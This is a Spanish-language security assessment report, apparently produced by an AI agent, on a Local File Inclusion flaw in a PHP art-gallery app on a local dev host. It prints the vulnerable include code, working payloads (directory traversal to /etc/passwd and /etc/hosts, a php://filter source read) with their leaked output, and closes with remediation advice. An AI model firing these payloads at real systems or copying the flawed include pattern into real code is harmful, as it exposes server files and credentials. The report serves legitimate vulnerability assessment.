# Informe de Análisis de Seguridad — Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-21T08:10:03Z  
**Analista:** Copilot CLI (Claude Sonnet 4.6)  
**Tipo de análisis:** Local File Inclusion (LFI)

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web objetivo. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo ficheros de configuración y credenciales del sistema operativo.

**Resultado:** ✅ Vulnerabilidad encontrada y explotada.

---

## Información del Objetivo

| Campo | Valor |
|-------|-------|
| URL | http://web.dev.local:8081 |
| Servidor | Apache/2.4.65 (Debian) |
| Tecnología | PHP/8.1.33 |
| Aplicación | Galería de Arte Virtual |

---

## Reconocimiento

La página de inicio (`index.php`) expone un menú de navegación con los siguientes enlaces:

- `gallery.php?page=modern`
- `gallery.php?page=classic`
- `gallery.php?page=abstract`
- `gallery.php?page=about`

El parámetro `page` en `gallery.php` es el vector de ataque principal.

---

## Análisis de la Vulnerabilidad

### Descripción

El fichero `gallery.php` incluye dinámicamente archivos del servidor basándose en el parámetro GET `page` **sin sanitización adecuada**. La lógica vulnerable es la siguiente (obtenida mediante `php://filter`):

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>...";
    // Try to include anyway
    @include($file);
}
```

**Fallo crítico:** Cuando el parámetro `page` contiene un punto (`.`), el valor se utiliza directamente como ruta de fichero sin ninguna restricción, permitiendo traversal de directorios con `../`.

### Clasificación

| Atributo | Valor |
|----------|-------|
| Tipo | Local File Inclusion (LFI) |
| CWE | CWE-22 (Path Traversal) / CWE-98 (Improper Control of Filename for Include/Require) |
| CVSS v3 | 7.5 (High) |
| Impacto | Lectura de ficheros arbitrarios del sistema |

---

## Explotación

### Vector 1: Traversal directo con `../`

**Payload:**
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
```

**Resultado exitoso — contenido de `/etc/passwd`:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Vector 2: Wrapper `php://filter` — Lectura de código fuente PHP

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php HTTP/1.1
```

**Resultado:** El código fuente de `gallery.php` es devuelto en base64 y puede decodificarse completamente, exponiendo la lógica interna de la aplicación.

### Vector 3: Lectura de `/etc/hosts`

**Payload:**
```
GET /gallery.php?page=../../../etc/hosts HTTP/1.1
```

**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
fe00::       ip6-localnet
ff00::       ip6-mcastprefix
ff02::1      ip6-allnodes
ff02::2      ip6-allrouters
172.19.0.2   d5054e367753
```

> Se confirma que el servidor corre en un contenedor Docker con IP `172.19.0.2`.

### Vectores probados sin éxito

| Payload | Resultado |
|---------|-----------|
| `../../../etc/passwd%00` (null byte) | No funciona (PHP >= 5.3.4) |
| `../../../proc/self/environ` | Permission denied |
| `/etc/passwd` (path absoluto directo) | No funciona (sin `.` en la ruta) |

---

## Impacto

1. **Divulgación de información del sistema**: Se pueden leer `/etc/passwd`, `/etc/hosts`, y otros ficheros del sistema.
2. **Lectura de código fuente**: Mediante `php://filter` se puede leer el código fuente PHP, revelando lógica de negocio, credenciales embebidas, etc.
3. **Escalada potencial**: Si hay ficheros de log accesibles y se puede inyectar código en ellos (Log Poisoning), la vulnerabilidad podría escalar a Remote Code Execution (RCE).

---

## Recomendaciones

1. **Validar y sanitizar el parámetro `page`**: Usar una lista blanca de páginas permitidas.
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($page, $allowed_pages)) {
       $page = 'modern';
   }
   $file = "pages/" . $page . ".php";
   ```
2. **Deshabilitar wrappers PHP peligrosos**: En `php.ini`:
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```
3. **Nunca incluir parámetros de usuario directamente** en funciones `include()`, `require()`, o similares.
4. **Implementar controles de acceso a ficheros**: Verificar que el fichero resuelto esté dentro del directorio permitido con `realpath()`.

---

## Conclusión

La aplicación `gallery.php` de la Galería de Arte Virtual presenta una vulnerabilidad **crítica de LFI** que permite a cualquier usuario no autenticado leer archivos arbitrarios del servidor. La explotación es trivial y no requiere autenticación ni herramientas especiales. Se recomienda corrección inmediata.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
